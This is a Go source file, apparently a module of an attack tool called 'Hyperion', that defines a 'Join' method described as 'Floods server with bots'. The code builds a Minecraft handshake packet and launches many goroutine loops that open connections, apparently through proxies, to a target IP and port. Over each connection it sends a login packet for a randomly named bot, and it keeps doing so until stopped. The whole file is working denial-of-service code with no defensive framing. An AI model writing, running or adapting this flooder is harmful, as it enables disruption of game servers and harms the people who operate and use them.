package methods

import (
	"Hyperion/core"
	"Hyperion/mc"
	"Hyperion/mc/mcutils"
	"Hyperion/mc/packet"
	"Hyperion/utils"
	"log"
	"strconv"
)

type Join struct {
	Info         *core.AttackInfo
}

var shouldRun = false
var handshakePacket packet.Packet

func (join Join) Name() string {
	return "Join"
}

func (join Join) Description() string {
	return "Floods server with bots"
}

func (join Join) Start() {
	utils.Init()
	shouldRun = true

	port, err := strconv.Atoi(join.Info.Port)
	if err != nil {
		log.Fatal(err)
	}

	handshakePacket = mcutils.GetHandshakePacket(join.Info.Ip, port, join.Info.Protocol, mcutils.Login)

	for i := 0; i < join.Info.Loops; i++ {
		go func() {
			for shouldRun {
				for j := 0; j < join.Info.PerDelay; j++ {
					loop(&join)
				}
			}
		}()
	}
}

func loop(join *Join) {
	for i := 0; i < join.Info.ConnPerProxy; i++ {
		go connect(&join.Info.Ip, &join.Info.Port, join.Info.Protocol)
	}
}

func connect(ip *string, port *string, protocol int) error {

	conn, err := mc.DialMC(ip, port)
	if err != nil {
		return err
	}

	conn.WritePacket(handshakePacket)
	conn.WritePacket(mcutils.GetLoginPacket("biq4_" + utils.RandomName(6), protocol))

	return nil
}

func (join Join) Stop() {
	shouldRun = false
}
